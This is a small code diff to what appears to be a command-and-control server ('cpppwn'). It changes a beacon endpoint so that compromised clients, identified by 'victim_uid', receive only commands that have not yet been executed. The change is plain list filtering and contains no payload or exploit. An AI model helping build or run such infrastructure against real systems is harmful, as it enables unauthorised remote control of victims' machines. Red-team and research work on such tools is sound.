@@ -4,6 +4,7 @@
 #include "Endpoints.hpp"
 #include "LogDAO.hpp"
 #include "Logger.hpp"
+#include <algorithm>
 #include <string>
 #include <vector>
 #include <chrono>
@@ -77,6 +78,11 @@ inline void register_beacon_endpoint(cpppwn::RESTServer& server) {
 
             // 4. Fetch Pending Commands (status 0)
             auto command_list = commands.get_repo()->get_for_client(beacon.victim_uid);
+
+            // remove all already "done" commands
+            std::erase_if(command_list, [](const CommandDAO& cmd) -> bool {
+                return cmd.status > 0;
+            });
 
             logger::info("Amount of commands #{}", command_list.size());
 
